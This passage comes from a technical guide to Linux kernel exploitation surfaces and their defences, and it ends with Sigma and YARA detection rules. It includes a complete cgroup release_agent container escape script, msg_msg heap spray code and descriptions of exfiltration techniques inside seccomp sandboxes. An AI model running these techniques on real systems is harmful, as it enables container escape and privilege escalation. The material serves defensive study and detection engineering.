`/proc` exposes kernel and process internals. Security-relevant entries:

| Path | Risk | Mitigation |
|------|------|------------|
| `/proc/kallsyms` | Kernel symbol addresses (KASLR bypass) | `kptr_restrict=2` |
| `/proc/PID/mem` | Read/write process memory | File permissions (owner only) |
| `/proc/PID/maps` | Process memory layout | `hidepid=2` mount option |
| `/proc/sys/kernel/` | Kernel tunables | Mount read-only in containers |
| `/proc/PID/root` | Chroot escape via symlink following | Namespace isolation |

Writable proc entries that have been exploited: `/proc/sys/kernel/core_pattern` (set to `|/path/to/program` to execute arbitrary code on core dump — a classic container escape when `/proc` is writable), `/proc/sys/kernel/modprobe` (path to module loader, writable with `CAP_SYS_ADMIN`), `/proc/sysrq-trigger` (trigger magic sysrq commands).

### 10.3 Overlayfs vulnerabilities

Overlayfs (union mount) has been a recurring source of privilege escalation:

- **CVE-2021-3493**: in Ubuntu kernels, overlayfs failed to check capabilities in the user namespace correctly when setting extended attributes, allowing an unprivileged user to set `security.capability` xattrs on overlay files and create setuid-root binaries
- **CVE-2023-0386**: a flaw in overlayfs copy-up of SUID files from a lower nosuid mount to an upper mount allowed privilege escalation — a file with SUID in the lower layer (which should not be effective due to nosuid) became effective when copied up

Exploitation pattern: create a user namespace + mount namespace, mount an overlayfs, manipulate files in the overlay to gain elevated privileges, then leverage those in the initial namespace.

### 10.4 FUSE exploitation

Filesystem in Userspace (FUSE) allows userspace programs to implement filesystems. From a kernel exploitation perspective, FUSE is useful as a primitive: the attacker creates a FUSE filesystem where `read()` or `getattr()` blocks arbitrarily. When the kernel accesses a file on this FUSE filesystem (e.g., during `copy_from_user` or path resolution), the kernel thread blocks in the FUSE handler, creating a controlled time window for race conditions.

This is the "FUSE-pause" technique: create a race condition where one kernel thread is paused in FUSE while another thread modifies shared state. Used in multiple published exploits as a race-window widener.

---

## 11. IPC Subsystem

### 11.1 System V IPC

System V IPC provides three mechanisms:

- **Shared memory** (`shmget`/`shmat`/`shmdt`/`shmctl`): allocates kernel memory segments shareable between processes
- **Message queues** (`msgget`/`msgsnd`/`msgrcv`/`msgctl`): kernel-managed message passing
- **Semaphores** (`semget`/`semop`/`semctl`): synchronization primitives

### 11.2 `msg_msg` heap spray

`struct msg_msg` is the kernel structure backing System V message queue messages. Its size is controllable by the sender (the message length), and it is allocated from generic `kmalloc-*` caches. This makes it one of the most versatile heap spray primitives:

```c
/* Spray msg_msg objects of size N into kmalloc-N cache */
int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
struct msgbuf {
    long mtype;
    char mtext[TARGET_SIZE - sizeof(struct msg_msg)];
} msg;
msg.mtype = 1;
memset(msg.mtext, 'A', sizeof(msg.mtext));
for (int i = 0; i < SPRAY_COUNT; i++)
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
```

The `msg_msg` header is 48 bytes (on x86_64), so a message of `N` bytes allocates from `kmalloc-(N+48)` (rounded up to the next slab size). Messages larger than a single page use `struct msg_msgseg` for continuation segments.

Key properties for exploitation:
- First 48 bytes are the `msg_msg` header (contains `m_list` linked-list pointers, `m_type`, `m_ts` size, `next` pointer to continuation)
- Remaining bytes are user-controlled message data
- Reading the message via `msgrcv` frees it (destructive read)
- `MSG_COPY` flag (if enabled) allows non-destructive peek — useful for leak primitives

### 11.3 Unix domain socket credential and fd passing

`SCM_CREDENTIALS` sends `struct ucred` (pid, uid, gid). The kernel can verify these credentials (`SO_PASSCRED` on the receiving socket). This is used for local authentication (systemd, D-Bus).

`SCM_RIGHTS` passes file descriptors across processes. The receiving process gets new fd numbers pointing to the same `struct file`. This enables privilege delegation: a privileged process opens a device/socket and passes the fd to an unprivileged process.

---

## 12. Driver Subsystem

### 12.1 Character device attack surface

Character devices (`/dev/foo`) expose `file_operations` to userspace. The primary attack surface is the `ioctl` handler: drivers implement `unlocked_ioctl` with command-specific dispatching, and complex ioctl handlers are where most driver vulnerabilities live.

Common vulnerability patterns in drivers:
- Buffer overflows in `copy_from_user`/`copy_to_user` with unchecked sizes
- Missing bounds checks on ioctl command arguments
- Race conditions between concurrent ioctl calls
- Incorrect `mmap` implementations exposing kernel memory to userspace

### 12.2 Driver fuzzing with syzkaller

`syzkaller` is the primary kernel fuzzer, developed by Google. It generates sequences of syscalls guided by grammar descriptions (`syzlang`):

```bash
# Build syzkaller
git clone https://github.com/google/syzkaller
cd syzkaller && make

# Run against a QEMU kernel
./bin/syz-manager -config my.cfg
```

`syzkaller` has found hundreds of kernel vulnerabilities, particularly in drivers, filesystems, and networking code. It uses coverage-guided fuzzing with KCOV (`CONFIG_KCOV=y`) to explore new code paths.

Custom ioctl fuzzers target specific drivers by generating valid ioctl command structures with fuzzed field values.

### 12.3 USB attack surface

USB gadget mode allows a device to emulate USB peripherals. From a security perspective:

- **BadUSB**: a device that emulates HID (keyboard/mouse) to inject keystrokes
- **USBFuzz**: fuzzing USB drivers via emulated USB devices in QEMU
- **USB descriptor parsing**: vulnerabilities in parsing malformed USB descriptors (device, configuration, interface, endpoint descriptors)

The USB subsystem has had numerous vulnerabilities in descriptor parsing, particularly in class-specific drivers (audio, video, mass storage, networking).

### 12.4 GPU drivers

GPU drivers (DRM/KMS subsystem) are among the largest and least-audited kernel code. Vulnerability patterns:

- Command-buffer/command-stream parsing bugs
- GPU memory management (`GEM`, `TTM`) object lifecycle errors
- Fence/sync-object race conditions
- IOMMU bypass through GPU DMA

---

## 13. Cgroup Subsystem

### 13.1 Cgroup v1 vs v2

| Aspect | Cgroup v1 | Cgroup v2 |
|--------|-----------|-----------|
| Hierarchy | Multiple hierarchies (one per controller) | Single unified hierarchy |
| Controllers | `cpu`, `memory`, `devices`, `freezer`, `net_cls`, `blkio`, `pids` | Same controllers, unified tree |
| Delegation | Per-hierarchy | `cgroup.subtree_control` |
| Thread mode | No | Yes (`cgroup.type = threaded`) |

### 13.2 Container escape via `release_agent`

The `release_agent` is a cgroup v1 feature: when the last process in a cgroup exits, the kernel executes the binary specified in the `release_agent` file. If an attacker inside a container can write to the host's cgroup `release_agent` file, they can execute arbitrary commands on the host.

The classic escape sequence (requires `CAP_SYS_ADMIN` in the container):

```bash
# Inside the container:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/exploit

# Set release_agent to a host-path command
echo 1 > /tmp/cgrp/exploit/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Write the payload
echo '#!/bin/sh' > /cmd
echo 'id > /output' >> /cmd
chmod a+x /cmd

# Trigger: create a process in the cgroup and let it exit
sh -c "echo \$\$ > /tmp/cgrp/exploit/cgroup.procs && sleep 0"

# Read result from host
cat /output
```

Mitigation: cgroup v2 removes `release_agent`. Run containers without `CAP_SYS_ADMIN`. Mount cgroup filesystem read-only. Use `--security-opt apparmor=docker-default` or equivalent.

### 13.3 Resource limit bypass

Cgroup resource limits can be circumvented:
- **Memory**: fork-bomb within memory limits to trigger OOM conditions affecting the host's OOM killer behavior
- **PID limits**: if `pids` controller is not configured, unlimited process creation enables DoS
- **Device access**: cgroup v1 `devices` controller uses a blocklist/allowlist; misconfigured lists allow access to host devices

---

## 14. LSM (Linux Security Modules)

### 14.1 SELinux

SELinux implements mandatory access control (MAC) via type enforcement. Every process has a security context (label) with the format `user:role:type:level`. Every object (file, socket, port) has a label. Policy rules define allowed operations between type pairs.

Key commands:

```bash
# Check enforcement mode
getenforce                        # Enforcing, Permissive, or Disabled
sestatus                          # Detailed status

# Manage booleans
getsebool -a                     # List all booleans
setsebool -P httpd_can_network_connect on

# Manage file contexts
semanage fcontext -a -t httpd_sys_content_t '/web(/.*)?'
restorecon -Rv /web

# Generate policy from audit denials
audit2allow -a -M mypolicy       # Generate policy module from audit log
semodule -i mypolicy.pp          # Install module

# Domain transitions
sesearch --allow -s httpd_t -t bin_t   # Search allowed transitions
```

SELinux bypass vectors: permissive domains (a domain set to `permissive` logs but does not enforce), `unconfined_t` (effectively unconfined processes), `audit2allow` over-permitting (generating overly broad policy from denials), and policy errors where a domain has `write` access to a type it shouldn't.

### 14.2 AppArmor

AppArmor uses path-based access control. Profiles define allowed file access, capabilities, and network operations per program:

```
# /etc/apparmor.d/usr.bin.myapp
#include <tunables/global>

/usr/bin/myapp {
    #include <abstractions/base>

    /etc/myapp.conf r,
    /var/log/myapp.log w,
    /tmp/myapp-* rw,
    /usr/lib/myapp/** mr,
    
    network inet stream,
    network inet dgram,
    
    deny /proc/*/mem rw,
    deny /sys/** w,
    
    capability net_bind_service,
}
```

Key commands:

```bash
aa-status                         # Show loaded profiles and their modes
aa-genprof /usr/bin/myapp         # Generate profile interactively
aa-complain /etc/apparmor.d/usr.bin.myapp  # Set to complain (log-only)
aa-enforce /etc/apparmor.d/usr.bin.myapp   # Set to enforce
aa-logprof                        # Update profiles from log entries
```

AppArmor limitations: path-based (hardlink/symlink can reference the same file under different paths), no label-based object tracking, no MLS/MCS.

### 14.3 Landlock

Landlock (Linux 5.13+) is a programmatic sandboxing LSM. Unlike SELinux/AppArmor (system-wide policy), Landlock allows unprivileged processes to restrict their own filesystem access:

```c
#include <linux/landlock.h>
#include <sys/syscall.h>

struct landlock_ruleset_attr attr = {
    .handled_access_fs =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_EXECUTE,
};

int ruleset_fd = syscall(SYS_landlock_create_ruleset, &attr, sizeof(attr), 0);

/* Allow read access to /usr */
struct landlock_path_beneath_attr path_attr = {
    .allowed_access = LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_EXECUTE,
    .parent_fd = open("/usr", O_PATH | O_CLOEXEC),
};
syscall(SYS_landlock_add_rule, ruleset_fd, LANDLOCK_RULE_PATH_BENEATH,
        &path_attr, 0);
close(path_attr.parent_fd);

/* Enforce */
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
syscall(SYS_landlock_restrict_self, ruleset_fd, 0);
close(ruleset_fd);
/* Process is now restricted — cannot access files outside /usr for read */
```

Landlock is stackable with other LSMs (SELinux, AppArmor) and with seccomp. Landlock v3 (Linux 6.2) added network access restriction (`LANDLOCK_ACCESS_NET_BIND_TCP`, `LANDLOCK_ACCESS_NET_CONNECT_TCP`).

### 14.4 LSM stacking

Linux supports multiple LSMs simultaneously. The stacking order is determined at boot:

```bash
cat /sys/kernel/security/lsm
# Example output: lockdown,capability,landlock,yama,apparmor,bpf

# Kernel config
CONFIG_LSM="lockdown,capability,landlock,yama,apparmor,bpf"
# Or boot parameter: lsm=lockdown,capability,landlock,yama,apparmor,bpf
```

Each LSM hook gets called in order. Any LSM can deny an operation (deny wins). This means Landlock restrictions are enforced even if AppArmor would allow the access.

---

## 15. Networking Subsystem

### 15.1 Socket internals and sk_buff

`struct sk_buff` is the fundamental network buffer. Every packet in the kernel is represented by an `sk_buff`:

- `head`/`data`/`tail`/`end`: pointers defining the buffer regions
- `skb_shared_info`: at the end of the data region, contains fragment list, GSO info
- Reference counting: `skb_get()`/`kfree_skb()` manage lifecycle

`sk_buff` vulnerabilities typically involve: incorrect length calculations leading to buffer overflows, missing validation of packet headers, use-after-free when an skb is freed while still referenced by a timer or workqueue, and type confusion when a packet is processed by the wrong protocol handler.

### 15.2 eBPF for networking

eBPF provides three networking attachment points:

**XDP (eXpress Data Path)**: runs at the NIC driver level, before `sk_buff` allocation. Operates on raw packet data (`struct xdp_md`). Actions: `XDP_PASS`, `XDP_DROP`, `XDP_TX` (reflect), `XDP_REDIRECT`. Used for DDoS mitigation and load balancing.

**TC (Traffic Control) classifiers**: runs after `sk_buff` allocation, at the TC layer. Operates on `struct __sk_buff`. Can modify packet contents, redirect, drop. Used for network policy enforcement (Cilium).

**Socket filter programs**: attached to individual sockets via `SO_ATTACH_BPF`. Filters packets before delivery to userspace.

### 15.3 Packet processing vulnerabilities

Malformed packet handling has produced numerous kernel vulnerabilities:

- IPv4/IPv6 option parsing: overly long or nested options
- TCP segmentation offload (TSO/GSO): incorrect segment size calculations
- Fragment reassembly: overlapping fragments, fragment cache exhaustion
- Protocol-specific: SCTP chunk processing, DCCP option handling, TIPC message parsing

Detection: nftables/netfilter rules to drop malformed packets at the network edge, combined with `SECCOMP_RET_LOG` for socket syscall monitoring.

---

## 16. Android-Specific Kernel Exploitation

### 16.1 Binder

The Binder IPC driver (`/dev/binder`, `/dev/hwbinder`, `/dev/vndbinder`) implements transactional IPC with reference counting, death notifications, shared memory, and cross-process object references. Vulnerability patterns: buffer overflows in transaction handling, UAF in binder node/ref management, race conditions in the death-notification path.

Binder is accessible to every app (the mechanism by which apps communicate with system services), making Binder vulnerabilities reachable from the app sandbox.

### 16.2 ION / dma-buf heaps

ION (migrating to dma-buf heaps in mainline) is Android's shared-memory allocation framework for multimedia buffers. Vulnerabilities in buffer lifecycle management, IOCTL handling, and DMA subsystem interaction.

### 16.3 GPU drivers (KGSL, Mali, PowerVR)

GPU drivers are vendor-specific and often the largest, least-audited code in the Android kernel. Vulnerability patterns: command-buffer parsing bugs, memory-mapping errors (GPU drivers manage their own page tables and IOMMU configuration), fence/sync-object lifecycle bugs.

GPU driver vulnerabilities are high-value: GPU drivers often have DMA access to all of physical memory, and a compromised GPU driver can read/write memory belonging to any process.

### 16.4 TrustZone communication

TrustZone divides the ARM CPU into Normal World (Android) and Secure World (TEE). Communication goes through SMC instructions and shared-memory buffers. The kernel-side driver (Qualcomm's `qseecom`, Samsung's `tbase`, Google's Trusty) is an attack surface: bugs in shared-memory handling or SMC argument marshaling can allow Normal World code to influence Secure World state.

### 16.5 Samsung Knox and KAP

Knox Kernel Address Protection (KAP) uses TrustZone to monitor critical kernel structures from the Secure World. The Secure World periodically checks `cred` structures, SELinux enforcement state, and kernel text integrity. Tampering trips a hardware fuse (e-fuse) permanently recording compromise.

Real-time Kernel Protection (RKP) intercepts page-table modifications and credential changes by trapping into the Secure World for validation. Bypassing Knox/RKP requires: a Secure World bug (hard — minimal, heavily-audited TEE), DMA from a compromised peripheral (some Knox versions don't fully monitor), or a logical gap in RKP validation.

### 16.6 Android SELinux policy

Android enforces SELinux in enforcing mode. Policy bypass vectors: overly-broad domain permissions, debugging/development exceptions remaining in production, confused-deputy attacks through Binder interfaces. Treble architecture separates vendor and platform policy — vendor policy is sometimes less restrictive, creating escape paths.

---

## 17. Exploitation Under Seccomp

### 17.1 The constrained attacker model

After gaining code execution inside a seccomp-filtered process, the attacker's available syscalls are restricted. This section catalogs remaining capabilities — critical for defenders evaluating sandbox strength.

### 17.2 Data exfiltration without `execve`

**`open`/`openat` + `read` + `write` chains**: if the filter allows file I/O, the attacker can open sensitive files and exfiltrate via an already-open socket fd. If `openat` is blocked, already-open fds or relative paths from an open directory fd may work.

**`sendfile`/`splice`/`copy_file_range`**: transfer data between fds without userspace buffers. `sendfile(socket_fd, file_fd, ...)` copies file data directly to a socket. Some profiles forget to block these less-common syscalls.

**`memfd_create`**: creates an anonymous memory-backed file. The fd can be written to and then `mmap`'d or passed via `SCM_RIGHTS`. Combined with `fexecve`/`execveat` (if not filtered), creates in-memory ELF execution.

### 17.3 Inter-process coordination

**`mmap(MAP_SHARED)` with a helper**: a cooperating process outside the sandbox shares memory via a shared `mmap` region (backed by shared file or `memfd_create` + fd passing). The sandboxed process writes data; the helper reads and performs privileged operations.

### 17.4 Seccomp user-notification exploitation

**TOCTOU against the supervisor**: the supervisor reads the sandboxed process's memory via `/proc/PID/mem` to inspect syscall arguments. Between the supervisor's read and its action, another thread changes the memory. Mitigations: `SECCOMP_IOCTL_NOTIF_ID_VALID`, `SECCOMP_ADDFD_FLAG_SETFD`, copying arguments to supervisor-owned memory.

**Supervisor confused-deputy**: the supervisor performs privileged operations based on the supervised process's requests without sufficient validation, granting access to resources the supervised process should not reach.

### 17.5 ROP chains that respect seccomp

An attacker with userspace ROP inside a seccomp-filtered process must use only allowed syscalls. If `execve` is blocked → no shell. If `mprotect(PROT_EXEC)` is blocked → no executable shellcode. The chain performs data exfiltration (open + read + write to existing socket), privilege escalation via allowed mechanisms (if any), or escape to a less-restricted process via shared memory or fd passing.

### 17.6 Blind exfiltration via side channels

When the filter blocks all obvious data-output syscalls:

**Timing**: operations that take measurably different time depending on data value. An external observer times the process's responses.

**Page faults**: access memory in a pattern depending on secret data. An observer process monitors page-fault timing via shared-cache side channels.

**Syscall return codes**: encode data in the pattern of syscall successes and failures (e.g., `open` on different paths returning `ENOENT` vs `EACCES`).

**Process exit code**: encode 8 bits in exit status, observable by the parent.

These channels are slow (bits/second) but sufficient for small secrets (keys, tokens). Defense requires co-location isolation beyond seccomp's scope.

---

## 18. Detection Engineering for Kernel Subsystem Exploitation

Detection engineering for kernel subsystem attacks operates at three layers: audit-log analysis (auditd, kernel audit framework), runtime behavioral detection (eBPF-based tools such as Falco, Tracee, Tetragon), and static artifact analysis (YARA rules on binaries and memory dumps). This section provides concrete detection rules organized by subsystem attack surface, covering the exploitation patterns described in sections 1 through 17. Detection engineers should deploy rules from multiple layers — audit-based detection catches the syscall-level indicators, eBPF-based tools capture process behavior and kernel-internal events, and YARA identifies exploit tooling on disk or in memory.

### 18.1 Sigma Rules for Kernel Exploitation Detection

Sigma provides a vendor-neutral format for expressing detection logic against log sources. The following rules target kernel subsystem exploitation indicators observable through Linux audit logs and system telemetry. Each rule specifies the log source, detection logic, severity, and the attack surface it covers.

**Rule 1 — Seccomp Violation Burst Detection.** Rapid `SECCOMP_RET_KILL_PROCESS` events from the same binary within a short time window indicate either brute-force exploitation attempts against a seccomp sandbox or a misconfigured application triggering policy violations during normal operation. The distinction lies in the violation rate and the triggering syscall diversity — exploit attempts typically produce bursts against a small set of blocked syscalls.

```yaml
title: Seccomp Violation Burst from Single Binary
id: 7a1c3d5e-9f2b-4a8d-b6c1-e4f7890abcde
status: experimental
description: >
  Detects rapid seccomp KILL events from the same executable, which may indicate
  an attacker probing a sandbox for allowed syscall paths or brute-forcing an
  exploit that triggers seccomp violations.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SECCOMP
    code: '0x80000000'  # SECCOMP_RET_KILL_PROCESS
  timeframe: 30s
  condition: selection | count(exe) by exe > 10
level: high
tags:
  - attack.defense_evasion
  - attack.t1211
falsepositives:
  - Application crash loops triggering seccomp on restart
  - Fuzzing activity in development environments
```

**Rule 2 — eBPF Program Loading by Non-Root.** The `bpf()` syscall with `BPF_PROG_LOAD` command from a process running as a non-root user is anomalous on hardened systems where `kernel.unprivileged_bpf_disabled=1`. If this event occurs, it suggests either a kernel bypass of the sysctl restriction or a misconfigured system. On systems where unprivileged BPF is still permitted, frequency and program type analysis provides the detection signal.

```yaml
title: eBPF Program Load by Unprivileged Process
id: 2b4e6f8a-1c3d-5e7f-9a0b-c2d4e6f8a1b3
status: experimental
description: >
  Detects BPF_PROG_LOAD syscall from processes without CAP_BPF or CAP_SYS_ADMIN.
  eBPF verifier exploits require loading a crafted BPF program.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall: bpf
    a0: '5'  # BPF_PROG_LOAD command
  filter_root:
    euid: '0'
  condition: selection and not filter_root
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Legitimate monitoring agents running with CAP_BPF
```

**Rule 3 — io_uring Setup from Unexpected Processes.** The `io_uring_setup` syscall (number 425 on x86_64) creates a new io_uring instance. In hardened environments, io_uring should be disabled via `io_uring_disabled` sysctl (§9.3). On systems where io_uring remains enabled, detection focuses on processes that should not use asynchronous I/O but invoke `io_uring_setup` — this pattern appears in exploit payloads that leverage io_uring to bypass seccomp or exploit io_uring subsystem vulnerabilities.

```yaml
title: io_uring Setup from Non-Database Non-Server Process
id: 3c5f7a9b-2d4e-6f8a-0b1c-d3e5f7a9b2d4
status: experimental
description: >
  Detects io_uring_setup calls from processes not expected to use async I/O.
  io_uring has been a persistent source of kernel privilege escalation and
  seccomp bypass (see §3.4, §9).
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall: io_uring_setup
  filter_expected:
    exe|endswith:
      - '/postgres'
      - '/mysqld'
      - '/nginx'
      - '/redis-server'
      - '/rocksdb'
  condition: selection and not filter_expected
level: high
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Custom applications legitimately using io_uring
```

**Rule 4 — Netfilter/nf_tables Manipulation from User Namespace.** The nf_tables subsystem is reachable from within a user namespace because `CAP_NET_ADMIN` can be obtained by creating a user namespace (§8.2). Exploits such as CVE-2023-32233 and CVE-2024-1086 create user namespaces to gain the required capability and then perform netlink operations against nf_tables. This rule detects the sequence of user namespace creation followed by netfilter operations.

```yaml
title: nf_tables Rule Manipulation from Non-Admin Context
id: 4d6a8b0c-3e5f-7a9b-1c2d-e4f6a8b0c3e5
status: experimental
description: >
  Detects nft table/chain/rule modifications by processes without host-level
  CAP_NET_ADMIN. Exploitation of nf_tables UAF vulnerabilities requires
  netlink-based rule manipulation.
logsource:
  product: linux
  service: auditd
detection:
  selection_unshare:
    type: SYSCALL
    syscall: unshare
    a0|contains: '10000000'  # CLONE_NEWUSER flag
  selection_netlink:
    type: SYSCALL
    syscall: sendmsg
  timeframe: 5s
  condition: selection_unshare | near selection_netlink
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Container runtimes legitimately creating namespaces
```

**Rule 5 — TTY Exploitation Indicators.** The `TIOCSTI` ioctl (Terminal I/O Control — Simulate Terminal Input) injects characters into a terminal's input queue. When issued from a non-interactive process (no controlling terminal or running as a daemon), it indicates an attempt to inject commands into another session. The `TIOCSTI` ioctl has been deprecated and disabled by default since Linux 6.2 via the `dev.tty.legacy_tiocsti` sysctl.

```yaml
title: TIOCSTI ioctl from Non-Interactive Process
id: 5e7b9c1d-4f6a-8b0c-2d3e-f5a7b9c1d4f6
status: experimental
description: >
  Detects TIOCSTI ioctl usage from processes without a controlling terminal.
  TIOCSTI can inject keystrokes into other terminal sessions for command
  injection attacks.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall: ioctl
    a1: '0x5412'  # TIOCSTI
  filter_interactive:
    tty|re: 'pts/[0-9]+'
  condition: selection and not filter_interactive
level: high
tags:
  - attack.execution
  - attack.t1059
falsepositives:
  - Screen/tmux session managers performing legitimate terminal operations
```

**Rule 6 — Kernel Module Loading Anomalies.** Kernel module loading (`finit_module`, `init_module`) from processes other than the system module loader (`modprobe`, `kmod`) or outside the standard module path (`/lib/modules/`) indicates either a rootkit installation or an attacker loading a vulnerable module to create an exploitation surface.

```yaml
title: Kernel Module Load from Non-Standard Path
id: 6f8c0d2e-5a7b-9c1d-3e4f-a6b8c0d2e5a7
status: experimental
description: >
  Detects kernel module loading from paths outside /lib/modules/ or by
  processes other than kmod/modprobe. Rootkits and exploit frameworks
  load custom modules for kernel code execution.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall:
      - init_module
      - finit_module
  filter_modprobe:
    exe:
      - '/usr/sbin/modprobe'
      - '/usr/bin/kmod'
      - '/sbin/modprobe'
  condition: selection and not filter_modprobe
level: critical
tags:
  - attack.persistence
  - attack.t1547.006
falsepositives:
  - DKMS building and loading custom modules
  - Development environments loading test modules
```

**Rule 7 — Cgroup Escape Indicators.** The cgroup `release_agent` escape (§13.2) requires writing to the `release_agent` file in a cgroup hierarchy and then triggering process exit from the target cgroup. This rule detects writes to `release_agent` files and modifications to `notify_on_release`, which together form the exploitation sequence.

```yaml
title: Cgroup release_agent Modification
id: 7a9d1e3f-6b8c-0d2e-4f5a-b7c9d1e3f6b8
status: experimental
description: >
  Detects writes to cgroup release_agent file, the primary indicator of the
  cgroup v1 container escape technique. Legitimate release_agent modification
  is extremely rare in production.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall:
      - openat
      - write
    name|contains: 'release_agent'
  condition: selection
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1611
falsepositives:
  - Cgroup management tools during initial system configuration
```

**Rule 8 — Unix Socket SCM_RIGHTS Flooding.** Passing large numbers of file descriptors via `SCM_RIGHTS` (§5.2) in rapid succession can indicate exploitation of the Unix socket garbage collector or an attempt to flood a privileged service with unexpected file descriptors for confused-deputy attacks.

```yaml
title: Excessive SCM_RIGHTS File Descriptor Passing
id: 8b0e2f4a-7c9d-1e3f-5a6b-c8d0e2f4a7c9
status: experimental
description: >
  Detects high-volume SCM_RIGHTS fd passing over Unix sockets, indicating
  potential Unix socket garbage collector exploitation or fd-based
  confused-deputy attacks against privileged services.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall: sendmsg
  timeframe: 10s
  condition: selection | count() by pid > 100
level: medium
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Container runtimes passing file descriptors during container setup
  - D-Bus heavy workloads
```

**Rule 9 — Unexpected Mount Namespace Creation.** User namespace creation followed by mount namespace creation (§10.3) is the precursor to overlayfs exploitation and various filesystem-based privilege escalation attacks. In container environments, mount namespace creation from within a container that already has a mount namespace is particularly suspicious.

```yaml
title: Mount Namespace Creation with User Namespace
id: 9c1f3a5b-8d0e-2f4a-6b7c-d9e1f3a5b8d0
status: experimental
description: >
  Detects unshare or clone with CLONE_NEWNS + CLONE_NEWUSER flags, the
  prerequisite for overlayfs and procfs-based privilege escalation techniques.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall:
      - unshare
      - clone
      - clone3
  selection_flags:
    a0|contains: '20000'  # CLONE_NEWNS
  condition: selection and selection_flags
level: medium
tags:
  - attack.privilege_escalation
  - attack.t1611
falsepositives:
  - Container runtimes (runc, crun) during container creation
  - Flatpak/Snap sandbox setup
```

**Rule 10 — Unusual Device ioctl Patterns.** Driver exploitation (§12) typically involves sending crafted ioctl commands to device files. High-frequency ioctl calls against device files such as `/dev/binder`, `/dev/kvm`, `/dev/dri/*`, or GPU devices from processes not expected to interact with those devices indicates either exploitation attempts or driver fuzzing.

```yaml
title: High-Frequency ioctl on Device Files
id: 0d2a4b6c-9e1f-3a5b-7c8d-e0f2a4b6c9e1
status: experimental
description: >
  Detects high-frequency ioctl syscalls against device special files from
  unexpected processes. Driver exploitation requires sending crafted ioctl
  commands, often in rapid succession during heap grooming phases.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall: ioctl
  filter_expected:
    exe|endswith:
      - '/Xorg'
      - '/Xwayland'
      - '/gnome-shell'
      - '/kwin_wayland'
  timeframe: 5s
  condition: selection and not filter_expected | count() by pid > 50
level: medium
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - GPU-accelerated applications performing legitimate rendering
  - Virtual machine managers performing KVM operations
```

### 18.2 YARA Rules for Kernel Exploit Artifacts

YARA rules complement log-based detection by identifying exploit binaries, payload signatures, and tooling on disk or in process memory. The following rules target patterns characteristic of kernel exploitation payloads, eBPF exploit programs, and container escape tools.

**Kernel privilege escalation shellcode patterns.** Kernel exploits that overwrite credential structures share a common pattern: they locate `current_task`, walk to the `cred` structure, and overwrite UID/GID fields with zero values and capability fields with all-ones. The compiled form of this logic produces recognizable byte sequences, particularly around the `prepare_kernel_cred(0)` and `commit_creds()` function call pattern.

```
rule kernel_privesc_payload {
    meta:
        description = "Detects compiled kernel privilege escalation payloads"
        author = "Detection Engineering"
        severity = "critical"
        date = "2025-01-15"
    strings:
        // commit_creds(prepare_kernel_cred(0)) pattern
        $prepare_kernel_cred = { 48 31 FF E8 ?? ?? ?? ?? 48 89 C7 E8 }
        // Direct cred structure overwrite pattern (uid=0, gid=0)
        $cred_overwrite = { C7 47 04 00 00 00 00 C7 47 08 00 00 00 00 }
        // swapgs; iretq return-to-user sequence
        $swapgs_iretq = { 0F 01 F8 48 CF }
        // kpti trampoline return pattern
        $kpti_tramp = { 0F 22 D8 0F 01 F8 48 CF }
        // task_struct traversal via current macro
        $current_task = { 65 48 8B 04 25 00 00 00 00 }
    condition:
        ($prepare_kernel_cred or $cred_overwrite) and
        ($swapgs_iretq or $kpti_tramp) and
        $current_task
}
```

**eBPF exploit program signatures.** eBPF verifier exploits embed crafted BPF programs that abuse specific ALU operations, bounds tracking errors, or type confusion. These programs typically contain distinctive instruction patterns such as unbounded arithmetic followed by map-value pointer dereference, or sequences that manipulate register bounds in ways that should be rejected by the verifier.

```
rule ebpf_exploit_program {
    meta:
        description = "Detects eBPF programs crafted to exploit verifier bugs"
        author = "Detection Engineering"
        severity = "critical"
        date = "2025-01-15"
    strings:
        // BPF_PROG_LOAD constant used in bpf() syscall
        $bpf_prog_load = { 05 00 00 00 }
        // ALU32 operations that commonly trigger verifier confusion
        // BPF_ALU64 | BPF_RSH | BPF_K followed by large shift value
        $alu_shift = { 77 0? 00 00 [1-4] 00 00 00 }
        // Map lookup followed by unchecked pointer arithmetic
        $map_lookup_chain = { 85 00 00 00 01 00 00 00 [0-16] 0F }
        // Known CVE-2021-3490 trigger: BPF_ALU64 | BPF_AND with tnum confusion
        $cve_2021_3490 = { 57 0? 00 00 FF FF FF 7F }
        // Strings found in public eBPF exploits
        $exploit_str1 = "BPF_MAP_TYPE_ARRAY" ascii
        $exploit_str2 = "trigger_bug" ascii
        $exploit_str3 = "overwrite_cred" ascii
    condition:
        $bpf_prog_load and
        (2 of ($alu_shift, $map_lookup_chain, $cve_2021_3490)) or
        (2 of ($exploit_str1, $exploit_str2, $exploit_str3))
}
```

**Container escape tooling detection.** Automated container escape tools such as CDK (Container Penetration Toolkit), DEEPCE, and precompiled kernel exploit binaries share identifiable strings and behavioral patterns. These tools enumerate the container environment, identify available escape vectors, and execute the appropriate exploit chain.

```
